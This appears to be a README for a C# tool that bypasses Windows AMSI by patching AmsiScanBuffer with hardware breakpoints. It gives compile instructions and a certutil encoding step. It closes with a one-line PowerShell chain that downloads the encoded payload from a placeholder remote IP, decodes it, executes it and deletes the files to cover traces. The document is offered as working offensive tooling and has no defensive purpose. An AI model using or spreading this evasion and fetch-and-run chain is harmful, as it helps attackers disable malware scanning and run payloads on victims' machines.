# Overview 

## This repo contains a C# implementation to patch AmsiScanBuffer utilizing hardware breakpoints. I used this code as a reference but optimized it and added comments for the code, https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e.

```
## How to compile
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:test.exe .\am_s.cs
```

## Encode the binary into a text file 
```powershell
certutil -encode test.exe test.txt
```
## Execute the binary using Microsoft signed binaries
```powershell
Start-Process -FilePath curl -ArgumentList "http://<IP>/test.txt -o $($pwd.Path)\test.txt" -Wait; certutil -decode "$($pwd.Path)\test.txt" "$($pwd.Path)\test.exe"; Start-Process -FilePath "$($pwd.Path)\test.exe" -Wait; Remove-Item -Path "$($pwd.Path)\test.exe"; Remove-Item -Path "$($pwd.Path)\test.txt"
```
